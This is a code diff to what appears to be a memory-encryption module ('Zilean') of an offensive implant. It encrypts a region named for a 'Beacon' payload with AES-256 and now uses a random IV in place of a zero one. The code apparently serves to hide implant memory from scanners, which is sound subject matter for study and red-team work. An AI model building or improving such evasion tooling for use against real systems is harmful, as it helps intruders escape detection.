@@ -135,12 +135,23 @@ BOOL Zilean_EncryptMemory(PZILEAN_CONTEXT pContext) {
 
     // Encrypt based on configuration
     if (pContext->config.bUseAES) {
-        BYTE iv[16] = { 0 };
+        // Generate random IV for AES-CBC
+        BCRYPT_ALG_HANDLE hAlgRng = NULL;
+        if (BCryptOpenAlgorithmProvider(&hAlgRng, BCRYPT_RNG_ALGORITHM, NULL, 0) == 0) {
+            BCryptGenRandom(hAlgRng, pContext->bIV, 16, 0);
+            BCryptCloseAlgorithmProvider(hAlgRng, 0);
+        }
+
         if (!Zilean_AES256_Encrypt(
             (BYTE*)pContext->config.pBeaconBase,
             pContext->config.szBeaconSize,
             pContext->config.bEncryptionKey,
-            iv)) {
+            pContext->bIV)) {
+            // Free backup memory on encryption failure
+            if (pContext->pOriginalMemory) {
+                HeapFree(GetProcessHeap(), 0, pContext->pOriginalMemory);
+                pContext->pOriginalMemory = NULL;
+            }
             return FALSE;
         }
     } else {
@@ -161,12 +172,11 @@ BOOL Zilean_DecryptMemory(PZILEAN_CONTEXT pContext) {
 
     // Decrypt based on configuration
     if (pContext->config.bUseAES) {
-        BYTE iv[16] = { 0 };
         if (!Zilean_AES256_Decrypt(
             (BYTE*)pContext->config.pBeaconBase,
             pContext->config.szBeaconSize,
             pContext->config.bEncryptionKey,
-            iv)) {
+            pContext->bIV)) {
             return FALSE;
         }
     } else {
